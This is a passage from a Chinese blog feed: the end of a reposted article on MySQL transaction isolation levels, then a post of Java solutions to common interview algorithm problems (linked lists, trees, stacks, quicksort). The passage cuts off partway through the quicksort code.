title="总结"></a><strong>总结</strong></h2><p>MySQL 的 InnoDB 引擎才支持事务，其中可重复读是默认的隔离级别。</p><p>读未提交和串行化基本上是不需要考虑的隔离级别，前者不加锁限制，后者相当于单线程执行，效率太差。</p><p>读提交解决了脏读问题，行锁解决了并发更新的问题。并且 MySQL 在可重复读级别解决了幻读问题，是通过行锁和间隙锁的组合 Next-Key 锁实现的。</p><p>作者：风的姿态<br>链接：<a href="https://link.zhihu.com/?target=https%3A//www.cnblogs.com/fengzheng/p/12557762.html">https://www.cnblogs.com/fengzheng/p/12557762.html</a><br>来源：博客园</p><p>转载自 <a href="https://zhuanlan.zhihu.com/p/117476959" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/117476959</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;经常提到数据库的事务，那你知道数据库还有事务隔离的说法吗，事务隔离还有隔离级别，那什么是事务隔离，隔离级别又是什么呢？本文就帮大家梳理一下。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;ACID特性&quot;&gt;&lt;a href=&quot;#ACID特性&quot; c
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>秋招算法</title>
    <link href="https://blog.kaluna.top/2021/09/22/%E7%A7%8B%E6%8B%9B%E7%AE%97%E6%B3%95/"/>
    <id>https://blog.kaluna.top/2021/09/22/%E7%A7%8B%E6%8B%9B%E7%AE%97%E6%B3%95/</id>
    <published>2021-09-22T00:29:52.192Z</published>
    <updated>2021-10-11T16:06:15.722Z</updated>
    
    <content type="html"><![CDATA[<h1 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h1><h2 id="简单题"><a href="#简单题" class="headerlink" title="简单题"></a>简单题</h2><h3 id="合并两个链表"><a href="#合并两个链表" class="headerlink" title="合并两个链表"></a>合并两个链表</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode prehead = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        ListNode prev = prehead;</span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="keyword">null</span> &amp;&amp; l2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (l1.val &lt;= l2.val) &#123;</span><br><span class="line">                prev.next = l1;</span><br><span class="line">                l1 = l1.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                prev.next = l2;</span><br><span class="line">                l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            prev = prev.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 合并后 l1 和 l2 最多只有一个还未被合并完，我们直接将链表末尾指向未合并完的链表即可</span></span><br><span class="line">        prev.next = l1 == <span class="keyword">null</span> ? l2 : l1;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> prehead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最大子序和"><a href="#最大子序和" class="headerlink" title="最大子序和"></a>最大子序和</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> dp = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> maxSum = dp;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//状态转移</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i  = <span class="number">1</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            dp = Math.max(dp + nums[i],nums[i]);</span><br><span class="line">            maxSum = Math.max(maxSum, dp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxSum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="路径总和"><a href="#路径总和" class="headerlink" title="路径总和"></a>路径总和</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> targetSum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> targetSum == root.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (hasPathSum(root.left, targetSum - root.val) || hasPathSum(root.right, targetSum - root.val));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="环形链表"><a href="#环形链表" class="headerlink" title="环形链表"></a>环形链表</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//解法一 哈希函数 set集合判重</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        Set&lt;ListNode&gt; seen = <span class="keyword">new</span> HashSet&lt;ListNode&gt;();</span><br><span class="line">        <span class="keyword">while</span> (head != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!seen.add(head)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解法二 快慢指针</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode slow = head;</span><br><span class="line">        ListNode fast = head.next;</span><br><span class="line">        <span class="keyword">while</span> (slow != fast) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fast == <span class="keyword">null</span> || fast.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最小栈"><a href="#最小栈" class="headerlink" title="最小栈"></a>最小栈</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> </span>&#123;</span><br><span class="line">    Deque&lt;Integer&gt; xStack;</span><br><span class="line">    Deque&lt;Integer&gt; minStack;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MinStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        xStack = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        minStack = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        minStack.push(Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        xStack.push(x);</span><br><span class="line">        minStack.push(Math.min(minStack.peek(), x));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        xStack.pop();</span><br><span class="line">        minStack.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> xStack.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> minStack.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="买卖股票的最佳时机"><a href="#买卖股票的最佳时机" class="headerlink" title="买卖股票的最佳时机"></a>买卖股票的最佳时机</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//暴力解法</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span> prices[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxprofit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; prices.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; prices.length; j++) &#123;</span><br><span class="line">                <span class="keyword">int</span> profit = prices[j] - prices[i];</span><br><span class="line">                <span class="keyword">if</span> (profit &gt; maxprofit) &#123;</span><br><span class="line">                    maxprofit = profit;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxprofit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//一次遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span> prices[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> minprice = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">int</span> maxprofit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &lt; minprice) &#123;</span><br><span class="line">                minprice = prices[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (prices[i] - minprice &gt; maxprofit) &#123;</span><br><span class="line">                maxprofit = prices[i] - minprice;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxprofit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="验证回文串"><a href="#验证回文串" class="headerlink" title="验证回文串"></a>验证回文串</h3><p>时间复杂度为O(s) s表示字符串的长度</p><p>空间复杂度为O(1)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; !Character.isLetterOrDigit(s.charAt(left))) &#123;</span><br><span class="line">                ++left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; !Character.isLetterOrDigit(s.charAt(right))) &#123;</span><br><span class="line">                --right;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">                <span class="keyword">if</span> (Character.toLowerCase(s.charAt(left)) != Character.toLowerCase(s.charAt(right))) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ++left;</span><br><span class="line">                --right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode prev = <span class="keyword">null</span>;</span><br><span class="line">        ListNode curr = head;</span><br><span class="line">        <span class="keyword">while</span> (curr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ListNode next = curr.next;</span><br><span class="line">            curr.next = prev;</span><br><span class="line">            prev = curr;</span><br><span class="line">            curr = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="中等题"><a href="#中等题" class="headerlink" title="中等题"></a>中等题</h2><h3 id="二叉树的最近公共祖先"><a href="#二叉树的最近公共祖先" class="headerlink" title="二叉树的最近公共祖先"></a>二叉树的最近公共祖先</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode ans;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Solution</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.ans = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">dfs</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">boolean</span> lson = dfs(root.left, p, q);</span><br><span class="line">        <span class="keyword">boolean</span> rson = dfs(root.right, p, q);</span><br><span class="line">        <span class="keyword">if</span> ((lson &amp;&amp; rson) || ((root.val == p.val || root.val == q.val) &amp;&amp; (lson || rson))) &#123;</span><br><span class="line">            ans = root;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> lson || rson || (root.val == p.val || root.val == q.val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dfs(root, p, q);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树的锯齿形层序遍历"><a href="#二叉树的锯齿形层序遍历" class="headerlink" title="二叉树的锯齿形层序遍历"></a>二叉树的锯齿形层序遍历</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; zigzagLevelOrder(TreeNode root) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; ans = <span class="keyword">new</span> LinkedList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Queue&lt;TreeNode&gt; nodeQueue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        nodeQueue.offer(root);</span><br><span class="line">        <span class="keyword">boolean</span> isOrderLeft = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!nodeQueue.isEmpty()) &#123;</span><br><span class="line">            Deque&lt;Integer&gt; levelList = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">int</span> size = nodeQueue.size();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">                TreeNode curNode = nodeQueue.poll();</span><br><span class="line">                <span class="keyword">if</span> (isOrderLeft) &#123;</span><br><span class="line">                    levelList.offerLast(curNode.val);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    levelList.offerFirst(curNode.val);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (curNode.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    nodeQueue.offer(curNode.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (curNode.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    nodeQueue.offer(curNode.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ans.add(<span class="keyword">new</span> LinkedList&lt;Integer&gt;(levelList));</span><br><span class="line">            isOrderLeft = !isOrderLeft;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sortArray(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.quickSort(nums,<span class="number">0</span>,nums.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] quickSort(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> left, <span class="keyword">int</span> right)&#123;</span><br><span class="line">        <span class="keyword">if</span>(right - left &lt;= <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> nums;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//选择最左边的元素构造子问题集合</span></span><br><span class="line">        <span class="keyword">int</span> x = nums[left];</span><br><span class="line">        <span class="comment">//小于x的放到左边，大于x的放到右边</span></span><br><span class="line">        <span class="comment">//int x = nums[left]</span></span><br><span class="line">        <span class="comment">//i代表x的位置</span></span><br><span class="line">        <span class="keyword">int</span> i = partition(nums,left,right);</span><br><span class="line">        <span class="comment">//省略计算x所在的位置i</span></span><br><span class="line">        <span class="comment">//以及将所有小于x的元素放到左边，大于x的元素放到右边</span></span><br><span class="line">        <span class="comment">//左闭右开 跳过x的位置</span></span><br><span class="line">        quickSort(nums,left,i);</span><br><span class="line">        quickSort(nums,i+<span class="number">1</span>,right);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = nums[left];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加一减一法</span></span><br><span class="line">        <span class="comment">//把不能确定的 确定</span></span><br><span class="line">        <span class="comment">//i指向左边不能确定的值 j指向右边不能确定的值</span></span><br><span class="line">        <span class="keyword">int</span> i = left + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> j = right;</span><br><span class="line">        <span class="comment">//x |--left--|--mid--|--right--|</span></span><br><span class="line">        <span class="keyword">while</span>(i != j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &lt; x)&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">this</span>.swap(nums, i, --j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//结束的时候要交换x和中间的值</span></span><br><span class="line">        <span class="keyword">this</span>.swap(nums, i-<span class="number">1</span>, left);</span><br><span class="line">        <span class="keyword">return</span> i-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] nums,<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = 